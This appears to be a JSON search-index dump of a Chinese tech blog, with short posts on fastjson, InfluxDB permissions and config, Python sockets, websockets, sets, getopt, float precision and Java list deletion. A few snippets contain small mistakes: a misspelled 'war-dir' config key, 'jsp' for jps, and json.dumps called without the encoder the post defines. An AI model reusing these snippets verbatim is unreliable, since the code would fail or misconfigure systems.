兼容方案既然fastjson有这个问题，那有必要看一下有没有使用方式来避免这个问题了，看一下fastjson的常用序列化方法 123456789101112131415161718192021222324252627282930/** * This method serializes the specified object into its equivalent Json representation. Note that this method works fine if the any of the object fields are of generic type, * just the object itself should not be of a generic type. If you want to write out the object to a * {@link Writer}, use {@link #writeJSONString(Writer, Object, SerializerFeature[])} instead. * * @param object the object for which json representation is to be created setting for fastjson * @return Json representation of {@code object}. */public static String toJSONString(Object object) { return toJSONString(object, emptyFilters);}public static String toJSONString(Object object, SerializerFeature... features) { return toJSONString(object, DEFAULT_GENERATE_FEATURE, features);}/** * @since 1.2.11 */public static String toJSONString(Object object, int defaultFeatures, SerializerFeature... features) { SerializeWriter out = new SerializeWriter((Writer) null, defaultFeatures, features); try { JSONSerializer serializer = new JSONSerializer(out); serializer.write(object); return out.toString(); } finally { out.close(); }} 我们常用的是上面的第一个方法，看到上面的第二个方法，自然可以想到，是不是可以通过传参来设置序列化的一些属性， SerializerFeature 是一个枚举，进去查看，会找到一些有意思的参数，如SerializerFeature.WriteNonStringKeyAsString将非字符串的key装换为String 12345678910@Testpublic void testJson() { Map&lt;Integer, String&gt; map = new HashMap&lt;&gt;(); map.put(1, \"hello\"); map.put(2, \"world\"); System.out.println(JSON.toJSONString(map)); // 如果key不是字符串，则序列化为字符串 System.out.println(JSON.toJSONString(map, SerializerFeature.WriteNonStringKeyAsString));} 输出结果如下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/04/12/190412-FastJson序列化对象中非字符串类型key输出非标准格式json串问题记录/"},{"title":"190505-InfluxDB之权限管理","text":"influxdb安装完毕之后，默认属于裸奔状态，为了安全起见，当然是需要加上权限管理，下面介绍下如何设置权限 I. 简单使用篇不考虑细节的情况下，我只希望可以添加一个用户/密码，然后只有输入用户/密码验证准确之后，就可以愉快的进行后续的编码逻辑；至于更多的用户权限管理，不想太了解的，可以直接看这一小节即可 1. 设置用户并赋权安装完毕之后，默认没有开启权限，因此可以直接连接 12345# 首先通过cli 连上influxdbinflux# 创建用户，密码，并赋予所有的权限create user admin with password 'admin' with all privileges 如下图，需要注意的是密码必须使用引号括起来，否则会出现下图中的报错 2. 开启权限校验1234vim /etc/influxdb/influxdb.conf# 开启配置auth-enabled = true 3. 重启并测试12345# 重启dbservice influxdb restart# 连接测试influx -username admin -password admin II. 权限管理前面介绍的基本上可以满足简单的db使用姿势了，接下来介绍下更多的使用说明 1. 用户管理创建用户 1create user xxx with password 'pwd' 重设密码 1set password for xxx='newpwd' 删除用户 1drop user xxx 查看用户 1show users 2. 权限管理针对用户进行授权和回收 授权 12GRANT ALL PRIVILEGES TO &lt;username&gt;GRANT [READ,WRITE,ALL] ON &lt;database_name&gt; TO &lt;username&gt; 回收 12REVOKE ALL PRIVILEGES FROM &lt;username&gt;REVOKE [READ,WRITE,ALL] ON &lt;database_name&gt; FROM &lt;username&gt; 权限查询 1show grants for &lt;username&gt; II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/05/190505-InfluxDB之权限管理/"},{"title":"190429-Python之获取本机ip地址","text":"环境区分，一种常见的case就是根据ip地址段进行界定，通过给开发环境，测试环境和生成环境映射到不同的ip地址段机器，因此也就有了获取ip地址的需求 1. 方法一通过主机名获取主机ip方式 12import socketsocket.gethostbyname(socket.gethostname()) 然而上面这个并不是总能返回正确的结果，如下面的case，返回127.0.0.1 2. 方法二123456import sockets = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)s.connect(('8.8.8.8', 80))ip = s.getsockname()[0]print(ip)s.close() 同样的机器，执行后结果如下 3. 方法三使用第三方库 netifaces 安装命令 1pip install netifaces mac版本使用case如下 12import netifaces as nini.ifaddresses('en0')[ni.AF_INET] linux的一个使用case如下 1234import netifaces# 打印所有的网卡netifaces.interfaces()netifaces.ifaddresses('enp1s0')[2] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/04/29/190429-Python之获取本机ip地址/"},{"title":"190509-InfluxDb之时间戳显示为日期格式","text":"直接使用influx-cli查询数据时，时间戳格式不太友好，记录下显示日期的方式 连接时添加参数 1influx -precision rfc3339 连接后设置参数 12345# 进入控制台influx# 设置参数precision rfc3339 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/09/190509-InfluxDb之时间戳显示为日期格式/"},{"title":"190416-Python之Webscoket模拟客户端简单使用","text":"记录下，如何使用python，实现简单的测试websocket接口 1. 依赖包1pip install websocket-client 2. 测试demo最基础的demo测试如下，发送一条数据，接收返回 12345678910from websocket import create_connectionws = create_connection(\"ws://127.0.0.1:8080/wsdemo\")# 发送数据ws.send(\"hello world\")# 接收数据result = ws.recv()print(result)# 关闭ws.close(); 3. 复杂使用方式对于websocket的使用而言，上面的使用场景属于比较少的，常见的是后端不断的推送数据，我这里一直接收数据，然后隔一段时间发送一个ping消息 对上面的场景进行拆分 一个线程实现不断的接收数据并打印 一个线程实现每隔10s发送一个ping消息 1234567891011121314151617181920212223242526272829303132# -*- coding: utf-8 -*-# create by yihui 20:03 19/4/16import threadingimport timefrom websocket import create_connectionws = create_connection(\"ws://127.0.0.1:8080/wsdemo\")def recv(): while True: result = ws.recv() print(f\"接收&gt;&gt;&gt;&gt; {result}\")def ping(): cnt = 0 while cnt &lt; 10: ws.send(\"ping\") time.sleep(2) cnt += 1rct = threading.Thread(target=recv, name='receiveThread')pt = threading.Thread(target=ping, name='pingThread')rct.start()pt.start()pt.join()ws.close() II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/04/16/190416-Python之Webscoket模拟客户端简单使用/"},{"title":"190513-Centos时间校准","text":"centos系统时间校准 1ntpdate cn.pool.ntp.org 安装ntp，然后后台启动，持续校准 12345678# 安装ntpsudo yum -y install ntp# 使用 ntpdate 测试 NTPntpdate cn.pool.ntp.org# 查看服务器时间date# 启动ntpd daemon，持续校准时间systemctl start ntpd II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/13/190513-Centos时间校准/"},{"title":"190514-查看java进程jvm参数","text":"java应用启动之后，有办法查看jvm参数么？ 可以通过jps -v来实现 1jsp -lv 如阿里的java进程输出如下 1228996 com.aliyun.tianji.cloudmonitor.Application -Djava.compiler=none -XX:-UseGCOverheadLimit -XX:NewRatio=1 -XX:SurvivorRatio=8 -XX:+UseSerialGC -Djava.io.tmpdir=../../tmp -Xms16m -Xmx32m -Djava.library.path=../lib:../../lib -Dwrapper.key=drcJnFxDcXCZH8of -Dwrapper.port=32000 -Dwrapper.jvm.port.min=31000 -Dwrapper.jvm.port.max=31999 -Dwrapper.disable_console_input=TRUE -Dwrapper.pid=28989 -Dwrapper.version=3.5.27 -Dwrapper.native_library=wrapper -Dwrapper.arch=x86 -Dwrapper.service=TRUE -Dwrapper.cpu.timeout=10 -Dwrapper.jvmid=12358 sun.tools.jps.Jps -Denv.class.path=.:/usr/java/jdk1.8.0_131/lib/dt.jar:/usr/java/jdk1.8.0_131/lib/tools.jar:/usr/java/jdk1.8.0_131/jre/lib -Dapplication.home=/usr/java/jdk1.8.0_131 -Xms8m II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/14/190514-查看java进程jvm参数/"},{"title":"190521-JDK之List遍历删除的几种使用姿势","text":"在实际的业务开发中，容器的遍历可以说是非常非常常见的场景了，遍历删除呢，用的机会也不会少，但你真的会用么 I. List遍历删除对于列表，这里以ArrayList进行举例说明，下面给出几种经常会遇到的写法 首先初始化一个list数组 1234List&lt;String&gt; list = new ArrayList&lt;&gt;();for (int i = 0; i &lt; 20; i++) { list.add(i + \"&gt;index\");} 1. foreach这个属于我们最常见的foreach循环，在循环内部判断满足条件的直接删除 12345for (String id : list) { if (id.contains(\"2\")) { list.remove(id); }} 上面这种写法导致的问题，很容易可以发现，因为上面代码跑完之后，堆栈就出来了 很典型的并发修改错误，在foreach循环中不允许删除,新增 2. 普通for循环123456for (int index = 0; index &lt; list.size(); index++) { if (index % 5 == 0) { list.remove(index); }}System.out.println(list); 上面这种写法呢？我们希望把列表中，第0，5，10，15位置的元素干掉，正常执行，倒是不会报错，然而输出的结果却和我们的预期不一致 for循环中，另外一种写法可能更加常见，为了避免每次都访问 list.size() 方法，我可能提前用一个变量保存数组大小 12345678int size = list.size();for (int index = 0; index &lt; size; index++) { if (index % 5 == 0) { list.remove(index); } else { System.out.print(list.get(index)); }} 上面这个问题就很明显了，数组越界 3. 迭代方式下面这种可以说是标准的迭代删除的写法了，基本上大多都是这么玩 12345678Iterator&lt;String&gt; iterator = list.iterator();while (iterator.hasNext()) { String tmp = iterator.next(); if (tmp.contains(\"2\")) { iterator.remove(); }} 4. jdk8+ 流方式jdk8+ 推荐下面这种写法，简洁明了 1list.removeIf(s -&gt; s.contains(\"3\")); II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/21/190521-JDK之List遍历删除的几种使用姿势/"},{"title":"190506-InfluxDB之配置修改","text":"influxdb安装完毕之后，一般来讲，有些配置有必要改一下的，比如默认的端口号，默认的数据存储位置，本篇将介绍下常用配置的修改姿势 I. 配置系统环境为centos，influxdb的版本为1.6 1. 配置文件默认配置文件安装目录为: /etc/influxdb/influxdb.conf 默认配置查看 1infuxd config 输出结果如 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153Merging with configuration at: /etc/influxdb/influxdb.confreporting-disabled = falsebind-address = &quot;127.0.0.1:8088&quot;[meta] dir = &quot;/var/lib/influxdb/meta&quot; retention-autocreate = true logging-enabled = true[data] dir = &quot;/var/lib/influxdb/data&quot; index-version = &quot;inmem&quot; wal-dir = &quot;/var/lib/influxdb/wal&quot; wal-fsync-delay = &quot;0s&quot; validate-keys = false query-log-enabled = true cache-max-memory-size = 1073741824 cache-snapshot-memory-size = 26214400 cache-snapshot-write-cold-duration = &quot;10m0s&quot; compact-full-write-cold-duration = &quot;4h0m0s&quot; compact-throughput = 50331648 compact-throughput-burst = 50331648 max-series-per-database = 1000000 max-values-per-tag = 100000 max-concurrent-compactions = 0 max-index-log-file-size = 1048576 series-id-set-cache-size = 100 trace-logging-enabled = false tsm-use-madv-willneed = false[coordinator] write-timeout = &quot;10s&quot; max-concurrent-queries = 0 query-timeout = &quot;0s&quot; log-queries-after = &quot;0s&quot; max-select-point = 0 max-select-series = 0 max-select-buckets = 0[retention] enabled = true check-interval = &quot;30m0s&quot;[shard-precreation] enabled = true check-interval = &quot;10m0s&quot; advance-period = &quot;30m0s&quot;[monitor] store-enabled = true store-database = &quot;_internal&quot; store-interval = &quot;10s&quot;[subscriber] enabled = true http-timeout = &quot;30s&quot; insecure-skip-verify = false ca-certs = &quot;&quot; write-concurrency = 40 write-buffer-size = 1000[http] enabled = true bind-address = &quot;:8086&quot; auth-enabled = true log-enabled = true suppress-write-log = false write-tracing = false flux-enabled = false flux-log-enabled = false pprof-enabled = true debug-pprof-enabled = false https-enabled = false https-certificate = &quot;/etc/ssl/influxdb.pem&quot; https-private-key = &quot;&quot; max-row-limit = 0 max-connection-limit = 0 shared-secret = &quot;&quot; realm = &quot;InfluxDB&quot; unix-socket-enabled = false unix-socket-permissions = &quot;0777&quot; bind-socket = &quot;/var/run/influxdb.sock&quot; max-body-size = 25000000 access-log-path = &quot;&quot; max-concurrent-write-limit = 0 max-enqueued-write-limit = 0 enqueued-write-timeout = 30000000000[logging] format = &quot;auto&quot; level = &quot;info&quot; suppress-logo = false[[graphite]] enabled = false bind-address = &quot;:2003&quot; database = &quot;graphite&quot; retention-policy = &quot;&quot; protocol = &quot;tcp&quot; batch-size = 5000 batch-pending = 10 batch-timeout = &quot;1s&quot; consistency-level = &quot;one&quot; separator = &quot;.&quot; udp-read-buffer = 0[[collectd]] enabled = false bind-address = &quot;:25826&quot; database = &quot;collectd&quot; retention-policy = &quot;&quot; batch-size = 5000 batch-pending = 10 batch-timeout = &quot;10s&quot; read-buffer = 0 typesdb = &quot;/usr/share/collectd/types.db&quot; security-level = &quot;none&quot; auth-file = &quot;/etc/collectd/auth_file&quot; parse-multivalue-plugin = &quot;split&quot;[[opentsdb]] enabled = false bind-address = &quot;:4242&quot; database = &quot;opentsdb&quot; retention-policy = &quot;&quot; consistency-level = &quot;one&quot; tls-enabled = false certificate = &quot;/etc/ssl/influxdb.pem&quot; batch-size = 1000 batch-pending = 5 batch-timeout = &quot;1s&quot; log-point-errors = true[[udp]] enabled = false bind-address = &quot;:8089&quot; database = &quot;udp&quot; retention-policy = &quot;&quot; batch-size = 5000 batch-pending = 10 read-buffer = 0 batch-timeout = &quot;1s&quot; precision = &quot;&quot;[continuous_queries] log-enabled = true enabled = true query-stats-enabled = false run-interval = &quot;1s&quot;[tls] min-version = &quot;&quot; max-version = &quot;&quot; 2. 数据存储修改从上面的配置中可以知道，默认的数据存储为/var/lib/influxdb/data， /var/lib/influxdb/wal, /var/lib/influxdb/meta 将数据保存在我们挂载的硬盘 /influx 第一步，修改配置文件 123456789vim /etc/influxdb/influxdb.conf## 修改配置[meta] dir = '/influx/meta' [data] dir = '/influx/data' war-dir = '/influx/wal' 第二步，修改用户组 重新制定存储目录之后，需要修改文件夹的owner和分组，否则influxdb将无法正常启动 1chown -R influxdb:influxdb /influx 第三步，重启 1service influxdb restart 3. 端口修改可以修改默认的端口号，首先进入配置文件 1234567[[udp]] bind-address = \":18089\"[[http]] bind-address = \":18086\" # 开启下权限验证，相关配置可以参考博文: https://blog.hhui.top/hexblog/2019/05/05/190505-InfluxDB之权限管理/ auth-enabled = true II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/06/190506-InfluxDB之配置修改/"},{"title":"190523-Python之json无法序列化部分类型数据问题解决方案","text":"直接使用python的json库，实现对象和json串的互转，一般使用姿势也很简单，然而今天在使用的时候，需要序列化的对象中有datetime类型的对象，结果就抛出了异常TypeError: Object of type datetime is not JSON serializable 1234567import jsonresult = {\"hello\": \"你好\", \"name\": \"一灰灰blog\"}str_json = json.dumps(result)print(str_json)j_res = json.loads(str_json)print(j_res) 普通执行没啥问题，今天的result中，存了一个datetime对象，结果报错了 接着上面的demo，添加一个datetime对象来实现场景复现 123import datetimeresult['now'] = datetime.datetime.now()str_json = json.dumps(result) 然后出现下面这个问题 从提示信息可以看出，关键点在于 TypeError: Object of type datetime is not JSON serializable 看json.dumps函数的接口前面，可以传入一个cls参数，这个用来自定义实现不同类型的序列化规则，如我们希望加一个时间的序列化 1234567891011class DateJsonEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj, datetime.datetime): s_t = obj.strftime('%Y-%m-%dT%H:%M:%S.%f').strip('0') return {\"$date\": s_t + 'Z'} elif isinstance(obj, datetime.date): return {\"$date\": obj.strftime('%Y-%m-%d')} else: return json.JSONEncoder.default(self, obj)str_json = json.dumps(result) 然后再看下输出，正常序列化了；但是反序列化时，就需要自己额外处理了 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/23/190523-Python之json无法序列化部分类型数据问题解决方案/"},{"title":"190603-Python 集合的基本操作","text":"在数学中，集合的一些常见操作，比如交集，并集，差集等在python的集合这个数据结构中，能否完美支持呢？ I. 集合基本使用1. 创建集合在python中创建一个集合比较简单，常见有两种方式 12345# 创建一个空集合a_set = set()# 创建并初始化一个集合b_set = { 1, 2, 3} 需要注意的是，在python中创建字典，也用的是 {key: value}，而 a={} 表示a是一个字典；所以我们创建空集合，必须使用 a=set() 2. 基本操作集合有哪些基本操作呢？ 添加 12345# 添加一个元素到集合中,如果不存在，则加入；否则不做任何处理a.add(4)# 通过列表，元组，字典方式，批量加入元素到集合中a.update(...) 下面来演示下，批量加入的方式 从上面的实测可以知道： update接收列表或者元组作为参数时，将列表/元组中的每个元素，逐一加入到集合中 update接收字典作为参数时，将字典中key逐一加到集合中 删除 删除集合中的元素，比较简单 1a.remove(xx) 判断元素是否在集合中 使用的是python中的in语句 12# 如果10在集合a中，则返回True；否则返回False10 in a 3. 集合操作接下来看一下集合的操作 集合交集 交集主要用到的是操作符 &amp;，形如 1a_set &amp; b_set 集合并集 并集主要用到的是操作符 |，形如 1a_set | b_set 补集/差集 补集表示在集合A中，但是不在集合B中的所有元素，组成的集合，在python中可以使用减号来实现 12345# 在集合a_set中，但是不在集合b_seta_set - b_set# 在集合b_set，但是不在集合 a_setb_set - a_set 对称差集 简单来讲，这个就是并集 - 交集，有多种实现方式 123456# 最简单的方式a_set ^ b_set# 并集 - 交集(a|b) - (a&amp;b)# 两个差集的并集(a-b) | (b-a) 测试下输出 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/06/03/190603-Python-集合的基本操作/"},{"title":"190325 Python 集合","text":"集合，最大的特点就是无序、无重复，本文将简单介绍一下集合的基本使用姿势 1. 创建和字典一样，用大括号，不同的是，没有key 12&gt;&gt;&gt; a = {1,2,3}&gt;&gt;&gt; a = set() 请注意，空集合不能直接用{}，因为这个被字典占用了，所以空集合使用set()来表示 2. 添加元素使用add来添加，如果没有则加入，如果有，则不操作 1234567&gt;&gt;&gt; a = {1,2,3}&gt;&gt;&gt; a.add(4)&gt;&gt;&gt; a{1, 2, 3, 4}&gt;&gt;&gt; a.add(4)&gt;&gt;&gt; a{1, 2, 3, 4} 除add之外，还可以通过update来添加元素，区别在于update的参数可以是一个序列（列表，元组，字典等），它会将序列拆解扔到集合中 12345678910&gt;&gt;&gt; a ={1,2,3}&gt;&gt;&gt; a.update([2,3,4,5])&gt;&gt;&gt; a{1, 2, 3, 4, 5}&gt;&gt;&gt; a.update(('a', 'b'))&gt;&gt;&gt; a{1, 2, 3, 4, 5, 'a', 'b'}&gt;&gt;&gt; a.update({'a': 1, 'b': 2, 'c': 10})&gt;&gt;&gt; a{1, 2, 3, 4, 5, 'a', 'b', 'c'} 如果参数是字典时，将字典的key扔到集合中 3. 删除元素使用remove进行删除，如果不存在时，会抛异常；如果不希望不存在时抛异常，可以使用discard 1234567&gt;&gt;&gt; a = {1, 2, 3, 4, 5, 'a', 'b', 'c'}&gt;&gt;&gt; a.remove(3)&gt;&gt;&gt; a{1, 2, 4, 5, 'a', 'b', 'c'}&gt;&gt;&gt; a.discard('e')&gt;&gt;&gt; a{1, 2, 4, 5, 'a', 'b', 'c'} 4. 遍历123a = {1,2,3}for x in a: print(x) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/25/190325-Python-集合/"},{"title":"190605-记录BigDecimal转int四舍五入的姿势","text":"从db中查了一个BigDecimal数据，希望按照四舍五入的方式进行取整，发现直接使用 intValue 不太对，特此记录一下正确姿势 1new BigDecimal(4.51).setScale(0, RoundingMode.HALF_EVEN).intValue() 如果我们直接使用 intValue，会发现输出结果是直接将小数后面的扔掉了；所以这个时候需要先设置精度，然后再取整，测试如下 12345678@Testpublic void testBigDecimal() { System.out.println(new BigDecimal(4.51).intValue()); System.out.println(new BigDecimal(4.51).setScale(0, RoundingMode.HALF_EVEN).intValue()); System.out.println(new BigDecimal(4.5).setScale(0, RoundingMode.HALF_EVEN).intValue()); System.out.println(new BigDecimal(4.49).setScale(0, RoundingMode.HALF_EVEN).intValue());} 输出结果如下: 12344544 在上面的使用中，我们使用的RoundingMode.HALF_EVEN这种取整模式，当然常见的四舍五入还有 HALF_UP 和 HALF_DOWN，其中up表示为5时，向上取整；down表示为5时，向下取整；根据实际需要选择即可 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/06/05/190605-记录BigDecimal转int四舍五入的姿势/"},{"title":"190525-Python之命令行参数解析getopt使用说明","text":"请求参数解析属于比较常见和基础的操作技能了，如果希望我们的脚本可以在启动时，传入一些参数，来实现不同的环境指定，条件判断等，可以怎么处理呢？ 本篇将介绍在python中，如何优雅的使用getopt，来解析我们的命令行参数 I. 实战教学1. 获取请求参数在解析参数之前就需要获取参数，这里主要借助的就是 sys.argv 1234import sys# 获取请求参数，为什么不要第一个？因为执行一般都是 python xxx.py，所以第一个参数没啥特别的意义arguments = sys.argv[1:] 2. 命令行参数方式熟悉linux的同学可能知道，我们常用的命令行参数有两种姿势，长类型和短类型 如我们查看一下ls的帮助，输出如下 看上面红框里面的，-a 表示短参， –all 表示长参 参数后面可以紧跟值，可以用空格也可以用=，如 短参数使用示例 123# 查看文件占用磁盘空间，下面两种姿势都可以，但是不能用=du -d 1du -d1 长参数使示例 123# 下面两种姿势都可以，但是1不能紧挨长参数du --max-depth 1du --max-depth=1 3. getopt使用说明使用getopt，需要指定短参和长参数 说明 短参 长参 类型 str list 格式 形如: het 形如: ['help', 'env', 'thread'] 有value 短参后+冒号, 如 e:， 使用时必须给参数值 长参数名+等号，如 env=， 使用时必须给参数值 实例说明，我们的python脚本接收两个参数，一个 -p 不要value（存在这个参数表示http请求走代理，否则不走代理），一个 -e 需要value（指定环境，如dev为开发，pro为生产） 所以我们的参数解析可以为 12345shortargs = 'pe:'longargs = ['env=', 'proxy']opts, args = getopt.getopt(sys.argv[1:], shortargs, longargs)print(opts, '---split------', args) 上面定义了两个参数，所以我们的测试命令可以为 1234567891011121314151617181920# 开发环境，走代理python ArgumentParse.py --env=dev -ppython ArgumentParse.py --env dev -ppython ArgumentParse.py -edev -ppython ArgumentParse.py -e dev -p# 开发环境，不走代理python ArgumentParse.py --env=dev# 两个参数都不传python ArgumentParse.py# env不传值python ArgumentParse.py --env# p 传值python ArgumentParse.py --proxy=test# 传入一个未定义的参数python ArgumentParse.py -a 从上面的输出可以得知 要求有值的参数，命令行待这个参数时，必须有值 要求没值的参数，命令行待这个参数时，必须没值 不能传入没有定义的参数 返回元组，第一个为解析后的参数列表，第二个为剩下的命令行参数（就是不是-开头） 4. 小结上面的使用比较简单，定义短，长参数，其中短参数如果必须要有值，加一个冒号；长参数必须有值，加一个等号 虽然实现了简单参数解析，但是功能并不够强大 要求参数必须存在时，需要自己额外处理 最常见的 -h --help，输出参数使用说明，也需要自己额外定制 参数值校验，需要额外处理 那么有没有更强大的参数解析方式呢? 敬请期待，下一篇的《optparser实现更强大的命令行参数解析》 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/25/190525-Python之命令行参数解析getopt使用说明/"},{"title":"190530-Python 浮点数精度设置的几种方式","text":"记录一下浮点数精度设置的几种方法 1. round方式内置函数，四舍五入，但是和我们一般理解意义上的四舍五入不太一样，先看下使用姿势 1round(digit, num) 第一个参数是浮点数，第二个参数标识保留的小数个数，第二个参数不传时，标识保留0个小数 接下来看下为什么说这个方法和传统的四舍五入不一样 一般的四舍五入实现是 (a + 0.5) 然后取整；但是我们这里却不是这样的 其规则如下: 碰到舍入的后一位为5的情况，如果要取舍的位数前的数是偶数，则直接舍弃，如果奇数这向上取舍 2. 字符串格式化使用字符串的格式化方式来间接实现我们希望的效果 1\"%.xf\" % digit 其中 x 表示具体需要保留的小数位数，digit 表示需要格式化的浮点数，它的实现效果和round一样 3. math.ceil与math.floor对于精度的设置，一般除了四舍五入之外，还有几种常见的就是向上，向下取整，因此 ceil 和 floor 就比较合适了 1234567891011from math import ceil, floor# ceil 向上取整ceil(1.2)ceil(-1.2)ceil(1.0)# floor 向下取整floor(1.2)floor(-1.2)floor(1.0) 4. decimal 精度如果对精度要求比较高，可以考虑使用decimal来操作 12345678from decimal import *def floatAdd(num1, num2, precision=2): getcontext().prec = precision # 设置精度 return float(Decimal(str(num1)) + Decimal(str(num2))) print(floatAdd(1.234567, 5.312, 4))print(float(Decimal(str(12345.67)) + Decimal(str(125.1)))) 注意上面的precision并不是表示保留多少位小数，而是最终的返回的“有效数字”个数（有效数字打引号，注意不是数学上的有效数字） II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/30/190530-Python-浮点数精度设置的几种方式/"},{"title":"190620 Python Input读取数据","text":"raw_input函数读取输入数据 1234&gt;&gt;&gt; str = input(\"请输入：\")请输入：yhh&gt;&gt;&gt; print(str)yhh II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 